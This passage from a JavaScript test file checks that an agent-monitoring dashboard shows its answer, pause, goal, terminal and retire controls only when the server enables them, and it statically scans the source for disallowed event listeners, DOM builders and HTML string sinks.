        const attempt = { verb: paused ? 'resume' : 'pause',
          payload: { request_id: 'A'.repeat(43), agent: ADA, control_lsn: LSN }, body: '{}', turnsAtSend: 3 };
        for (const control of [idle, { ...idle, attempt, sending: true }]) {
          collect(renderToStaticMarkup(createElement(ControlStripView, { control, floor: state, row })));
        }
        const outcomes = [{ kind: 'applied' }, { kind: 'pending' }, { kind: 'unavailable' }, { kind: 'unknown' },
          { kind: 'refused', reason: 'agent_halted' }, { kind: 'conflict' }, { kind: 'forbidden' },
          { kind: 'rejected', status: 400 }];
        for (const outcome of outcomes) {
          for (const sending of [false, true]) {
            collect(renderToStaticMarkup(createElement(ControlStatusView, {
              control: { ...idle, attempt, outcome, sending, uncertain: true }, floor: state, session: 1 })));
          }
        }
      }
    }
  }
  assert.deepEqual([...labels].filter((label) => !CONTROL_LABELS.has(label)), [], 'a control carries an unlisted label');
  assert.deepEqual([...labels].sort(), [...CONTROL_LABELS].sort(), 'the sweep did not draw each CONTROL_LABELS entry, so it proves nothing');
  for (const label of labels) assert.doesNotMatch(label, /halt|restart/i);
});

const ADMITTED_LISTENERS = Object.freeze([
  { path: 'src/main.tsx', line: "window.addEventListener('hashchange', () => {" },
  { path: 'src/renderer/AgentDetail.tsx', line: "strip.addEventListener('wheel', wheel, { passive: false });" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "document.addEventListener('visibilitychange', onVisibilityChange);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "motionPreference.addEventListener('change', onMotionChange);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "colourPreference.addEventListener('change', onTheme);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('pointerdown', pressStart);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('pointermove', pressMove);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('pointerup', pressEnd);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('pointercancel', pressEnd);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('wheel', onWheel, { passive: false });" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('keydown', pressKey);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('focusin', schedule);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "box.addEventListener('focusout', schedule);" },
  { path: 'src/renderer/OfficeCanvas.tsx', line: "canvas.addEventListener('webglcontextlost', onContextLost);" },
  { path: 'src/renderer/desktopNotifications.ts', line: "notification.addEventListener('click', () => {" },
  { path: 'src/shell.tsx', line: "preference.addEventListener('change', onThemePreference);" },
  { path: 'src/shell.tsx', line: "document.addEventListener('keydown', onShortcut);" },
]);
const SOCKET_LISTENER = /(socket|live)\.addEventListener\('(open|message|close)'|addEventListener\(type: '(open|close|message)'/;

test('desktop notifications have one opt-in handler, one permission request and one fixed payload shape', async () => {
  const permission = [];
  const constructors = [];
  const optIn = [];
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const text = await readFile(path, 'utf8');
    const syntax = parsedByExtension(text, relative);
    (function walk(node) {
      if (ts.isCallExpression(node) && node.expression.getText(syntax) === 'Notification.requestPermission') {
        permission.push([relative, node.getText(syntax)]);
      }
      if (ts.isNewExpression(node) && node.expression.getText(syntax) === 'Notification') {
        constructors.push([relative, node.getText(syntax)]);
      }
      if (ts.isCallExpression(node) && node.expression.getText(syntax) === 'desktopNotificationPreference.setEnabled') {
        optIn.push([relative, node.getText(syntax)]);
      }
      ts.forEachChild(node, walk);
    })(syntax);
  }
  assert.deepEqual(permission, [['src/renderer/desktopNotifications.ts', 'Notification.requestPermission()']]);
  assert.deepEqual(constructors, [['src/renderer/desktopNotifications.ts',
    'new Notification(notice.title, { body: notice.body, tag: notice.key })']]);
  assert.deepEqual(optIn, [[SETTINGS_VIEW, 'desktopNotificationPreference.setEnabled(!on)']]);
});

test('each addEventListener line under floor/src is a socket or an admitted view listener', async () => {
  const attaching = [];
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const text = await readFile(path, 'utf8');
    for (const [line] of text.matchAll(/^.*addEventListener\(.*$/gm)) {
      attaching.push({ path: path.slice(floor.length + 1), line: line.trim() });
    }
  }
  assert.ok(attaching.length > 0, 'the scan found no addEventListener line, so it is measuring nothing');
  const found = [];
  for (const { path, line } of attaching) {
    if (ADMITTED_LISTENERS.some((rule) => rule.path === path && rule.line === line)) {
      found.push({ path, line });
      continue;
    }
    assert.match(line, SOCKET_LISTENER, `${path} attaches a listener to something other than the stream: ${line}`);
  }
  assert.deepEqual(found, ADMITTED_LISTENERS, 'a view listener was removed, moved or attached twice');
  // The control: the socket check refuses a DOM listener, so the admission above is the only way through.
  assert.doesNotMatch("document.addEventListener('click', go);", SOCKET_LISTENER);
  for (const rule of ADMITTED_LISTENERS) assert.doesNotMatch(rule.line, SOCKET_LISTENER);

  const canvas = await readFile(resolve(source, 'renderer/OfficeCanvas.tsx'), 'utf8');
  assert.match(canvas, /new ResizeObserver\(/);
  assert.match(canvas, /document\.removeEventListener\('visibilitychange', onVisibilityChange\)/);
  assert.match(canvas, /motionPreference\.removeEventListener\('change', onMotionChange\)/);
});

// --- the answer form: rendered only with the sibling ----------------------------------

const ADA = '01JBQ8XK2M3N4P5Q6R7S8T9VWX';
const LSN = '1099511628288';
const QUESTION = 'Ship 7f3a9c1e or wait for review?';
const SIBLING = Object.freeze({ max_text_bytes: 4096 });

function waiting(fields = {}) {
  return {
    id: ADA, name: 'Ada', role: 'backend engineer', department: 'engineering', provider: 'claude',
    status: 'waiting', mode: 'managed', turns: 1, question: QUESTION, question_lsn: LSN, ...fields,
  };
}

/** The `control` sibling, exactly as the daemon sends it when pause and resume are on. */
const CONTROL = Object.freeze({});

/** A Managed agent mid-turn, not paused, whose newest control record is at `LSN`. */
function working(fields = {}) {
  return {
    id: ADA, name: 'Ada', role: 'backend engineer', department: 'engineering', provider: 'claude',
    status: 'running', mode: 'managed', paused: false, halted: false, turns: 3, control_lsn: LSN, ...fields,
  };
}

/**
 * The real store, fed one real snapshot. An `undefined` sibling is left out,
 * as the default configuration leaves out every one.
 */
function floorWith(row, answer, control, goal, terminal, retire) {
  resetFloorStore();
  const epoch = beginFloorEpoch();
  noteTransport('open');
  const frame = { type: 'floor.snapshot', projection: { lsn: 9, agents: row === null ? [] : [row] } };
  if (answer !== undefined) frame.answer = answer;
  if (control !== undefined) frame.control = control;
  if (goal !== undefined) frame.goal = goal;
  if (terminal !== undefined) frame.terminal = terminal;
  if (retire !== undefined) frame.retire = retire;
  applyServerFrame(JSON.stringify(frame), epoch);
  return getFloorState();
}

let server;
let stage;

before(async () => {
  server = await createServer({
    root: floor,
    cacheDir: resolve(floor, 'node_modules/.vite-no-answer-surface'),
    server: { middlewareMode: true, hmr: false },
    appType: 'custom',
    logLevel: 'silent',
  });
  stage = await loadStage(server);
});

after(async () => {
  await server?.close();
});

/** The stage with the floor's one agent selected, and a Control view when one is named, as the page renders it. */
function center(state, view = null) {
  return stage({ floor: state, view });
}

test('the answer form renders when the snapshot carries the answer sibling', () => {
  // The positive control for the absence checks below: with answering on, the form is there.
  const html = center(floorWith(waiting(), SIBLING));
  assert.match(html, /<textarea[^>]*name="answer"/);
  assert.match(html, />Send answer</);
  assert.match(html, new RegExp(`data-answer-agent-id="${ADA}" data-answer-question-lsn="${LSN}"`));
  // Where the live case looks for it: in the selected agent's own panel, under its question.
  assert.match(html,
    /id="selected-agent-detail"[\s\S]*<aside class="agent-detail"[\s\S]*<section class="agent-detail-question"[\s\S]*<textarea/);
  assert.doesNotMatch(center(floorWith(waiting(), SIBLING), 'overview').split('<div class="receipts">')[0], /<textarea|name="answer"/,
    'Overview lists the question but answers only through the agent\'s own panel');
});

test('the answer gate stays closed without the sibling, an open question, a canonical lsn, or an unattached agent', () => {
  const open = (state, row = state.agents[0] ?? null) => answerGate(state, row).open;
  // The control: each gate condition met, and the gate opens with the sibling's own limit.
  const baseline = floorWith(waiting(), { max_text_bytes: 300 });
  assert.deepEqual(answerGate(baseline, baseline.agents[0]), {
    open: true, agent: ADA, questionLsn: LSN, question: QUESTION, maxTextBytes: 300, turns: 1, deferredGoal: null,
  });
  assert.equal(open(floorWith(waiting({ question_lsn: '18446744073709551615' }), SIBLING)), true);

  const closed = {
    'no answer sibling': floorWith(waiting(), undefined),
    'a malformed sibling': floorWith(waiting(), { max_text_bytes: '4096' }),
    'a sibling over the daemon bound': floorWith(waiting(), { max_text_bytes: 4097 }),
    'no question_lsn': floorWith(waiting({ question_lsn: undefined }), SIBLING),
    'a numeric question_lsn': floorWith(waiting({ question_lsn: 1099511628288 }), SIBLING),
    'a zero question_lsn': floorWith(waiting({ question_lsn: '0' }), SIBLING),
    'a leading zero': floorWith(waiting({ question_lsn: '01' }), SIBLING),
    'a question_lsn above u64': floorWith(waiting({ question_lsn: '18446744073709551616' }), SIBLING),
    'an empty question': floorWith(waiting({ question: '' }), SIBLING),
    'an attached mode': floorWith(waiting({ mode: 'attached' }), SIBLING),
    'an attached status': floorWith(waiting({ status: 'attached' }), SIBLING),
    'a running agent': floorWith(waiting({ status: 'running' }), SIBLING),
  };
  for (const [label, state] of Object.entries(closed)) {
    assert.equal(open(state), false, `${label} opened the answer gate`);
  }
  const live = floorWith(waiting(), SIBLING);
  assert.equal(open(live, null), false, 'no selected row opened the answer gate');
  assert.equal(open(live, waiting({ id: '01ARZ3NDEKTSV4RRFFQ69G5FAV' })), false,
    'a row the floor does not list — a retired agent — opened the answer gate');
  noteStale(true);
  assert.equal(open(getFloorState(), live.agents[0]), false, 'an unconfirmed view opened the answer gate');
  const between = floorWith(waiting(), SIBLING);
  invalidateFloorEpoch();
  assert.equal(open(getFloorState(), between.agents[0]), false, 'a view between subscriptions opened the answer gate');
});

test('with the same Waiting row but no answer sibling, no answer form renders', () => {
  const html = center(floorWith(waiting(), undefined));
  // The question is on screen, so the absence below is the gate's, not a missing panel's.
  assert.match(html, /<section class="agent-detail-question"/);
  assert.ok(html.includes(QUESTION), 'the Waiting question is not displayed, so this proves nothing');
  assert.doesNotMatch(html, /<textarea|name="answer"|Send answer|data-answer-/);
  const asking = center(floorWith(waiting(), undefined), 'overview');
  assert.match(asking, new RegExp(`<li class="waiting-item" data-waiting-kind="question" data-waiting-agent-id="${ADA}">`));
  assert.ok(asking.includes(QUESTION), 'Overview does not list the Waiting question, so this proves nothing');
  assert.doesNotMatch(asking, /<textarea|name="answer"|Send answer|data-answer-/);
  // Nor for an agent a person is attached to, even with answering on.
  assert.doesNotMatch(center(floorWith(waiting({ mode: 'attached', status: 'attached' }), SIBLING)),
    /<textarea|data-answer-/);
});

// --- pause and resume: rendered only with the sibling ------------------------------------

test('Pause and Resume render when the snapshot carries the control sibling', () => {
  // The positive control for the absence checks below: with control on, the buttons are there.
  const html = center(floorWith(working(), undefined, CONTROL));
  assert.match(html, /<button type="button" class="control-pause"[^>]*>Pause<\/button>/);
  assert.match(html, new RegExp(`data-control-agent-id="${ADA}" data-control-lsn="${LSN}"`));
  // Where the live case looks for them: in the selected agent's own panel, under its name.
  assert.match(html,
    /id="selected-agent-detail"[\s\S]*<aside class="agent-detail"[^>]*>[\s\S]*<h2 id="agent-detail-title" tabindex="-1">Ada<\/h2>[\s\S]*?<div class="agent-detail-actions"><div class="agent-detail-control"[\s\S]*class="control-pause"/);
  const paused = center(floorWith(working({ paused: true }), undefined, CONTROL));
  assert.match(paused, /<button type="button" class="control-resume"[^>]*>Resume<\/button>/);
  assert.doesNotMatch(paused, /class="control-pause"/);
});

test('the control gate stays closed without the sibling, a live confirmed view, the agent on the floor, or a canonical control_lsn', () => {
  const open = (state, row = state.agents[0] ?? null) => controlGate(state, row).open;
  // The control: each gate condition met, and the gate opens with the row's own position, as text.
  const baseline = floorWith(working(), undefined, CONTROL);
  assert.deepEqual(controlGate(baseline, baseline.agents[0]), {
    open: true, agent: ADA, controlLsn: LSN, offer: 'pause', halted: false, turns: 3,
  });
  assert.equal(open(floorWith(working({ control_lsn: '18446744073709551615' }), undefined, CONTROL)), true);
  assert.equal(open(floorWith(working({ control_lsn: undefined }), undefined, CONTROL)), true);

  const closed = {
    'no control sibling': floorWith(working(), undefined, undefined),
    'only the answer sibling': floorWith(working(), SIBLING, undefined),
    'a sibling with a member': floorWith(working(), undefined, { enabled: true }),
    'an array sibling': floorWith(working(), undefined, []),
    'a string sibling': floorWith(working(), undefined, '{}'),
    'a numeric control_lsn': floorWith(working({ control_lsn: 1099511628288 }), undefined, CONTROL),
    'a zero control_lsn': floorWith(working({ control_lsn: '0' }), undefined, CONTROL),
    'a leading zero': floorWith(working({ control_lsn: '01' }), undefined, CONTROL),
    'a control_lsn above u64': floorWith(working({ control_lsn: '18446744073709551616' }), undefined, CONTROL),
    'an empty control_lsn': floorWith(working({ control_lsn: '' }), undefined, CONTROL),
    'a null control_lsn': floorWith(working({ control_lsn: null }), undefined, CONTROL),
  };
  for (const [label, state] of Object.entries(closed)) {
    assert.equal(open(state), false, `${label} opened the control gate`);
  }
  const live = floorWith(working(), undefined, CONTROL);
  assert.equal(open(live, null), false, 'no selected row opened the control gate');
  assert.equal(open(live, working({ id: '01ARZ3NDEKTSV4RRFFQ69G5FAV' })), false,
    'a row the floor does not list — a retired agent — opened the control gate');
  noteStale(true);
  assert.equal(open(getFloorState(), live.agents[0]), false, 'an unconfirmed view opened the control gate');
  const between = floorWith(working(), undefined, CONTROL);
  invalidateFloorEpoch();
  assert.equal(open(getFloorState(), between.agents[0]), false, 'a view between subscriptions opened the control gate');
});

test('with the same rows but no control sibling, no Pause or Resume renders', () => {
  const none = /control-pause|control-resume|data-control-|>Pause<|>Resume<|Check status/;
  const paused = center(floorWith(working({ paused: true }), undefined, undefined));
  // The paused row is on screen, so the absence below is the gate's, not a missing panel's.
  assert.match(paused, /<p class="agent-detail-pause" role="status" data-pause-state="pausing">Pausing — /,
    'the paused row is not drawn, so this proves nothing');
  assert.doesNotMatch(paused, none);
  const running = center(floorWith(working(), undefined, undefined));
  assert.match(running, /<aside class="agent-detail"/);
  assert.doesNotMatch(running, none);
  // Nor with only answering on.
  assert.doesNotMatch(center(floorWith(working({ paused: true }), SIBLING, undefined)), none);
});

// --- goal change: rendered only with the sibling ----------------------------------------

/** The `goal` sibling, exactly as the daemon sends it when goal change is on. */
const GOAL = Object.freeze({ max_text_bytes: 2048 });
const GOAL_ID = '01JBQ8XK2M3N4P5Q6R7S8T9VWY';

/** An idle Managed agent pursuing a goal that has turns and dollars left. */
function pursuing(fields = {}) {
  return working({
    status: 'idle',
    goal: { id: GOAL_ID, text: 'ship the parser', status: 'in_progress', budget: { usd: 5_000_000 }, turns: 2,
      hop_cap: 20, spent: { usd: 1_000_000, tokens: 10, work_tokens: 8 } },
    ...fields,
  });
}

test('the goal form renders when the snapshot carries the goal sibling', () => {
  // The positive control for the absence checks below: with goal change on, the form is there.
  const html = center(floorWith(pursuing(), undefined, CONTROL, GOAL));
  assert.match(html, /<textarea[^>]*name="goal"/);
  assert.match(html, />Change goal<\/button>/);
  assert.match(html, new RegExp(`data-goal-agent-id="${ADA}" data-goal-id="${GOAL_ID}"`));
  // Where the live case looks for it: in the selected agent's own panel, after Pause.
  assert.match(html,
    /id="selected-agent-detail"[\s\S]*<aside class="agent-detail"[\s\S]*class="control-pause"[\s\S]*<section class="agent-detail-goal"[\s\S]*<textarea/);
});

test('the goal gate stays closed without the sibling, or with any other sibling alone', () => {
  const open = (state) => goalGate(state, state.agents[0] ?? null).open;
  // The control: the same row with the sibling opens the gate with the sibling's own limit.
  const baseline = floorWith(pursuing(), undefined, undefined, { max_text_bytes: 300 });
  assert.deepEqual(goalGate(baseline, baseline.agents[0]), {
    open: true, agent: ADA, goal: GOAL_ID, maxTextBytes: 300, carry: { turns: 18, usdAtMost: 4_000_000 },
    turnRunning: false, turns: 3, currentCheck: null, enrolled: [], achieved: false,
  });
  const closed = {
    'no goal sibling': floorWith(pursuing(), undefined, undefined, undefined),
    'only the answer sibling': floorWith(pursuing(), SIBLING, undefined, undefined),
    'only the control sibling': floorWith(pursuing(), undefined, CONTROL, undefined),
    'the answer and control siblings': floorWith(pursuing(), SIBLING, CONTROL, undefined),
    'an empty sibling': floorWith(pursuing(), undefined, CONTROL, {}),
    'a sibling over the daemon bound': floorWith(pursuing(), undefined, CONTROL, { max_text_bytes: 2049 }),
    'a string limit': floorWith(pursuing(), undefined, CONTROL, { max_text_bytes: '2048' }),
    'a sibling with a second member': floorWith(pursuing(), undefined, CONTROL, { max_text_bytes: 2048, enabled: true }),
  };
  for (const [label, state] of Object.entries(closed)) {
    assert.equal(open(state), false, `${label} opened the goal gate`);
  }
});

test('with the same rows but no goal sibling, no goal form renders', () => {
  const none = /<textarea|name="goal"|Change goal|data-goal-|goal-carry/;
  for (const [label, answer, control] of [
    ['the default configuration', undefined, undefined],
    ['answering on', SIBLING, undefined],
    ['pause and resume on', undefined, CONTROL],
    ['answering, pause and resume on', SIBLING, CONTROL],
  ]) {
    const html = center(floorWith(pursuing(), answer, control, undefined));
    // The goal is on screen, so the absence below is the gate's, not a missing panel's.
    assert.match(html, /<dt>Goal<\/dt><dd>ship the parser<\/dd>/, `${label}: the goal is not drawn, so this proves nothing`);
    assert.doesNotMatch(html, none, `${label} drew the goal form`);
  }
});

// --- the terminal: offered only with the sibling ----------------------------------------

/** The `terminal` sibling, exactly as the daemon sends it when the terminal is on. */
const TERMINAL = Object.freeze({});

/** A Managed agent between turns, with a confirmed session: the one kind the Floor may attach. */
function resting(fields = {}) {
  return working({ status: 'idle', session: '5f0c1d2e-0000-4000-8000-000000000608', ...fields });
}

test('Attach renders when the snapshot carries the terminal sibling', () => {
  // The positive control for the absence checks below: with the terminal on, Attach is there.
  const html = center(floorWith(resting(), undefined, undefined, undefined, TERMINAL));
  assert.match(html,
    /<h2 id="agent-detail-title" tabindex="-1">Ada<\/h2>[\s\S]*?<div class="agent-detail-actions"><div class="agent-detail-terminal" data-terminal-offer="attach"><button type="button" class="terminal-attach"[^>]*>Attach<\/button>/);
});

test('the terminal offer stays none without the sibling, a live confirmed view, or the agent on the floor', () => {
  const offer = (state, row = state.agents[0] ?? null) => terminalOffer(state, row, { phase: 'idle' }).kind;
  assert.equal(offer(floorWith(resting(), undefined, undefined, undefined, TERMINAL)), 'attach');
  const none = {
    'no terminal sibling': floorWith(resting(), undefined, undefined, undefined, undefined),
    'only the control sibling': floorWith(resting(), undefined, CONTROL, undefined, undefined),
    'only the goal sibling': floorWith(resting(), undefined, undefined, GOAL, undefined),
    'a sibling with a member': floorWith(resting(), undefined, undefined, undefined, { enabled: true }),
    'an array sibling': floorWith(resting(), undefined, undefined, undefined, []),
    'a string sibling': floorWith(resting(), undefined, undefined, undefined, '{}'),
  };
  for (const [label, state] of Object.entries(none)) assert.equal(offer(state), 'none', `${label} offered a terminal`);
  const live = floorWith(resting(), undefined, undefined, undefined, TERMINAL);
  assert.equal(offer(live, null), 'none', 'no selected row offered a terminal');
  assert.equal(offer(live, resting({ id: '01ARZ3NDEKTSV4RRFFQ69G5FAV' })), 'none',
    'a row the floor does not list — a retired agent — offered a terminal');
  noteStale(true);
  assert.equal(offer(getFloorState(), live.agents[0]), 'none', 'an unconfirmed view offered a terminal');
  const between = floorWith(resting(), undefined, undefined, undefined, TERMINAL);
  invalidateFloorEpoch();
  assert.equal(offer(getFloorState(), between.agents[0]), 'none', 'a view between subscriptions offered a terminal');
});

test('with the same rows but no terminal sibling, no terminal control renders', () => {
  const none = /terminal-|data-terminal-|>Attach<|>Detach<|Attach waits|keyboard/;
  const html = center(floorWith(resting(), undefined, CONTROL, undefined, undefined));
  // The agent's own panel is drawn, Pause included, so the absence below is the gate's.
  assert.match(html, /<aside class="agent-detail"[\s\S]*class="control-pause"/, 'the detail is not drawn, so this proves nothing');
  assert.doesNotMatch(html, none);
  for (const fields of [{ status: 'running' }, { halted: true }, { mode: 'attached', status: 'attached' },
    { session: undefined }]) {
    assert.doesNotMatch(center(floorWith(resting(fields), SIBLING, CONTROL, GOAL, undefined)), none);
  }
});

// --- Retire: offered only with the sibling --------------------------------------------

/** The `retire` sibling, exactly as the daemon sends it when retiring is on. */
const RETIRE = Object.freeze({});

test('Retire renders when the snapshot carries the retire sibling', () => {
  // The positive control for the absence checks below: with retiring on, Retire is there.
  const html = center(floorWith(working(), undefined, CONTROL, undefined, undefined, RETIRE));
  assert.match(html,
    new RegExp(`<div class="retire-offer"><button type="button" class="retire-open" data-retire-offer="${ADA}"[^>]*>Retire</button>`));
  // Where the live case looks for it: in the selected agent's own panel, after Pause.
  assert.match(html, /<aside class="agent-detail"[\s\S]*class="control-pause"[\s\S]*class="retire-open"/);
  // A halted agent has the local route named instead, and no button.
  const halted = center(floorWith(working({ halted: true }), undefined, CONTROL, undefined, undefined, RETIRE));
  assert.match(halted, /A halted agent is retired with the local <code>agent\.retire<\/code> call\./);
  assert.doesNotMatch(halted, /data-retire-offer/);
});

test('the retire offer stays none without the sibling, a live confirmed view, or the agent on the floor', () => {
  const offer = (state, row = state.agents[0] ?? null) => retireOffer(state, row).kind;
  const baseline = floorWith(working(), undefined, undefined, undefined, undefined, RETIRE);
  assert.deepEqual(retireOffer(baseline, baseline.agents[0]), { kind: 'retire', agent: ADA, name: 'Ada' });
  const none = {
    'no retire sibling': floorWith(working(), undefined, undefined, undefined, undefined, undefined),
    'only the control sibling': floorWith(working(), undefined, CONTROL, undefined, undefined, undefined),
    'only the terminal sibling': floorWith(working(), undefined, undefined, undefined, TERMINAL, undefined),
    'every other sibling': floorWith(working(), SIBLING, CONTROL, GOAL, TERMINAL, undefined),
    'a sibling with a member': floorWith(working(), undefined, CONTROL, undefined, undefined, { enabled: true }),
    'an array sibling': floorWith(working(), undefined, CONTROL, undefined, undefined, []),
    'a string sibling': floorWith(working(), undefined, CONTROL, undefined, undefined, '{}'),
  };
  for (const [label, state] of Object.entries(none)) assert.equal(offer(state), 'none', `${label} offered Retire`);
  const live = floorWith(working(), undefined, CONTROL, undefined, undefined, RETIRE);
  assert.equal(offer(live, null), 'none', 'no selected row offered Retire');
  assert.equal(offer(live, working({ id: '01ARZ3NDEKTSV4RRFFQ69G5FAV' })), 'none',
    'a row the floor does not list — a retired agent — offered Retire');
  noteStale(true);
  assert.equal(offer(getFloorState(), live.agents[0]), 'none', 'an unconfirmed view offered Retire');
  const between = floorWith(working(), undefined, CONTROL, undefined, undefined, RETIRE);
  invalidateFloorEpoch();
  assert.equal(offer(getFloorState(), between.agents[0]), 'none', 'a view between subscriptions offered Retire');
});

test('with the same rows but no retire sibling, no Retire control renders', () => {
  const none = /retire-|data-retire-|>Retire<|agent\.retire/;
  for (const [label, answer, control, goal, terminal] of [
    ['the default configuration', undefined, undefined, undefined, undefined],
    ['pause and resume on', undefined, CONTROL, undefined, undefined],
    ['every other switch on', SIBLING, CONTROL, GOAL, TERMINAL],
  ]) {
    for (const fields of [{}, { halted: true }, { paused: true }]) {
      const html = center(floorWith(resting(fields), answer, control, goal, terminal, undefined));
      // The agent's own panel is drawn, so the absence below is the gate's.
      assert.match(html, /<aside class="agent-detail"/, `${label}: the detail is not drawn, so this proves nothing`);
      assert.doesNotMatch(html, none, `${label}, ${JSON.stringify(fields)} drew Retire`);
    }
  }
});

// --- no control built without JSX -----------------------------------------------------

/**
 * Names that build or copy an element without JSX, put a node into the page
 * outside React, or define a new kind of element. `Image`, `Option` and
 * `Audio` are HTML's named element constructors. A custom element registry
 * defines a tag that JSX could then render as an intrinsic one, and a
 * form-associated custom element can act as a hidden field.
 * ChildNode's `before` and `after` are not listed: the stream's timers have
 * an `after`, and this scan reads names, not types. `append` is listed
 * although URLSearchParams, Headers and FormData have one too, as may an
 * imported function, so a use of theirs is admitted on purpose, in
 * `ADMITTED_BUILDS`.
 */
const BUILDERS = new Set(['createElement', 'createElementNS', 'cloneElement', 'createFactory', 'jsx', 'jsxs', 'jsxDEV',
  'cloneNode', 'importNode', 'adoptNode', 'appendChild', 'append', 'prepend', 'insertBefore', 'replaceChild',
  'replaceChildren', 'replaceWith', 'insertAdjacentElement', 'moveBefore', 'insertNode', 'surroundContents',
  'Image', 'Option', 'Audio', 'customElements', 'CustomElementRegistry']);
const APPEND_ELSEWHERE = ' (URLSearchParams, Headers and FormData have an append too: '
  + "admit one that is not the DOM's by its exact text in ADMITTED_BUILDS)";
/**
 * Expressions the floor may build in, by file and exact text: a `BUILDERS`
 * use inside one is admitted. The figure portrait asks a detached canvas
 * whether the page may draw in 3D. The whole expression is pinned, so the
 * canvas element itself is never bound to a name. Its context can be, though,
 * and that context's `canvas` property still reaches the element; this scan
 * does not follow a bound context's `canvas` read back to it.
 */
const ADMITTED_BUILDS = [
  { file: 'src/renderer/figurePortrait.ts', expression: "document.createElement('canvas').getContext('webgl2')" },
];
/**
 * Names that turn an HTML string into elements. `setHTML` and `parseHTML`
 * are here although they sanitize: a caller's sanitizer configuration can
 * allow `input`, `form` and `button`. `execCommand` is here for its
 * `insertHTML` command.
 */
const HTML_SINKS = new Set(['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'createContextualFragment',
  'dangerouslySetInnerHTML', 'srcdoc', 'srcDoc', 'setHTML', 'setHTMLUnsafe', 'parseHTML', 'parseHTMLUnsafe',
  'execCommand', 'DOMParser']);

/**
 * Whether a `new Terminal(…)` takes its `fontFamily` as a string literal. The
 * terminal writes that value into a style element of its own, so it must be a
 * constant and never text an agent wrote.
 */
function literalFontFamily(node) {
  const [options] = node.arguments ?? [];
  if (options === undefined || !ts.isObjectLiteralExpression(options)) return false;
  if (options.properties.some(ts.isSpreadAssignment)) return false;
  const font = options.properties.find((property) => ts.isPropertyAssignment(property)
    && spelledName(property.name) === 'fontFamily');
  return font !== undefined && ts.isStringLiteralLike(font.initializer);
}

/**
 * Terminal options that only a `new Terminal` literal may set. `windowOptions`
 * turns on reports that answer the program with text, such as the window
 * title, so the floor sets it nowhere; `fontFamily` stays the literal above.
 */
const PINNED_TERMINAL_OPTIONS = new Set(['fontFamily', 'windowOptions']);

/** Whether a `new Terminal(…)` names `windowOptions` among its options. */
function setsWindowOptions(node) {
  const [options] = node.arguments ?? [];
  return options !== undefined && ts.isObjectLiteralExpression(options) && options.properties
    .some((property) => property.name !== undefined && spelledName(property.name) === 'windowOptions');
}

/** Whether `node` assigns `….options.fontFamily` or `….options.windowOptions`, in either access form. */
function assignsPinnedOption(node) {
  if (!ts.isBinaryExpression(node) || node.operatorToken.kind < ts.SyntaxKind.FirstAssignment
    || node.operatorToken.kind > ts.SyntaxKind.LastAssignment) return false;
  const target = node.left;
  if (!ts.isPropertyAccessExpression(target) && !ts.isElementAccessExpression(target)) return false;
  const holder = target.expression;
  return PINNED_TERMINAL_OPTIONS.has(spelledName(target))
    && (ts.isPropertyAccessExpression(holder) || ts.isElementAccessExpression(holder)) && spelledName(holder) === 'options';
}

/**
 * Whether `attribute` sits on a lowercase (DOM) JSX tag rather than a
 * component's: a component reads its own string props, so a refused name
 * passed as one is not exempt the way a DOM attribute's literal value is.
 */
function onIntrinsicTag(attribute) {
  return isIntrinsicTagName(attribute.parent.parent.tagName);
}

/**
 * The spellings of a control the JSX scans above cannot see, which this scan
 * finds: a use of a `BUILDERS` name, but one inside an `ADMITTED_BUILDS`
 * expression in its file, which it lists apart; a use of an `HTML_SINKS`
 * name; and a JSX tag that is neither an intrinsic element nor a component
 * this file imports or declares — a tag held in a variable renders whatever
 * the variable holds. A use is a name `nameRead` returns, called or not, or
 * any other string literal but a JSX attribute's value on a lowercase
 * intrinsic tag (`onIntrinsicTag`). Refused outright, unless the name is read
 * only through a TypeScript type position — a type reference, a literal type,
 * a `typeof` type query — which runs nothing; an `extends` clause still runs,
 * so it stays a use, and an `implements` clause stays refused alongside it,
 * sharing that node kind though TypeScript erases it. It also finds a
 * `document.writeln` call, a `setAttribute` whose name is `style` in any
 * case, a `new Terminal` whose `fontFamily` is not a string literal or that
 * sets `windowOptions`, and a later assignment to `….options.fontFamily` or
 * `….options.windowOptions`.
 */
function builtWithoutJsx(text, file) {
  const syntax = parsedByExtension(text, file);
  const found = [];
  const admitted = new Set();
  const bound = new Set();
  let tags = 0;
  let terminals = 0;
  (function bind(node) {
    if (ts.isFunctionDeclaration(node) && node.name) bound.add(node.name.text);
    if (ts.isImportDeclaration(node) && ts.isStringLiteral(node.moduleSpecifier)) {
      const from = node.moduleSpecifier.text;
      if (/^react\/jsx-(?:dev-)?runtime$/.test(from)) found.push(`an import from ${from}`);
      const clause = node.importClause;
      if (clause?.name) bound.add(clause.name.text);
      const named = clause?.namedBindings;
      if (named && ts.isNamedImports(named)) {
        for (const element of named.elements) bound.add(element.name.text);
      }
    }
    ts.forEachChild(node, bind);
  })(syntax);
  const pins = ADMITTED_BUILDS.filter((rule) => rule.file === file).map((rule) => rule.expression);
  const pinnedAround = (node) => {
    for (let at = node; at !== undefined && pins.length > 0; at = at.parent) {
      if (pins.includes(at.getText(syntax))) return at;
    }
    return undefined;
  };
  (function walk(node) {
    if (ts.isTypeNode(node) && !ts.isExpressionWithTypeArguments(node)) return;
    const exempt = node.parent !== undefined && ts.isJsxAttribute(node.parent) && onIntrinsicTag(node.parent);
    const name = nameRead(node)
      ?? (ts.isStringLiteralLike(node) && !exempt ? node.text : null);
    if (name !== null && BUILDERS.has(name)) {
      const pinned = pinnedAround(node);
      if (pinned !== undefined) admitted.add(pinned);
      else found.push(`a use of ${name}${name === 'append' ? APPEND_ELSEWHERE : ''}`);
    }
    if (name !== null && HTML_SINKS.has(name)) found.push(`an HTML string sink, ${name}`);
    if (ts.isCallExpression(node)) {
